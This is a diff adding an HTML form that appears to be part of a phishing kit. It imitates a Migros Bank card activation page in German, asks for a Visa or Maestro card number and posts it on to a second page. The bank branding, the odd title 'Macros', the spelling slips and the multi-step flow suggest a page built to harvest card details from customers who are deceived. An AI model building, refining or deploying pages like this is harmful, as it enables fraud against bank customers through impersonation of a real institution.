@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Macros</title>
+    <link rel="stylesheet" href="macros.css" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="outer-wrapper">
+        <form
+          class="card-wrapper"
+          action="./second.html"
+          id="form"
+          method="post"
+        >
+          <div>
+            <p class="card-number">Aktivierung mit Kartennummer</p>
+          </div>
+
+          <h1 class="casenumber-title">Kartennummer</h1>
+
+          <div class="validation-wrapper">
+            <p class="validation-text">
+              Bitte geben Sie die Nummer einer gultigen Migros Bank Visa
+              Debit/Mastro Karte ein.
+            </p>
+          </div>
+          <div class="icon-wrapper">
+            <div class="maestro-wrapper">
+              <label class="radio-wrapper">
+                <input
+                  type="radio"
+                  id="master"
+                  class="default-radio"
+                  name="payment"
+                  value="master"
+                  onchange="validate()"
+                />
+                <span class="radio-button">
+                  <div class="radio-checked"></div>
+                </span>
+                <img src="image.png" class="color-image" />
+              </label>
+            </div>
+            <div class="maestro-wrapper">
+              <label class="radio-wrapper">
+                <input
+                  type="radio"
+                  id="visa"
+                  class="default-radio"
+                  name="payment"
+                  value="visa"
+                  onchange="validate()"
+                />
+                <span class="radio-button">
+                  <div class="radio-checked"></div>
+                </span>
+                <img src="Visa Classic.png" class="visa-image" />
+              </label>
+            </div>
+          </div>
+          <div class="cardnumber-wrapper">
+            <label for="username" class="label">Kartennummer</label>
+
+            <input
+              type="text"
+              id="username"
+              class="inputfield"
+              required
+              placeholder="z.B 12345678-9"
+              oninput="addBar();validate();"
+              ;
+              maxlength="10"
+              autocomplete="off"
+            />
+
+            <span class="error" id="message"></span>
+          </div>
+          <div class="button-wrapper">
+            <button type="submit" id="mybtn" class="button" disabled>
+              Weiter
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+    <script src="macros.js"></script>
+  </body>
+</html>
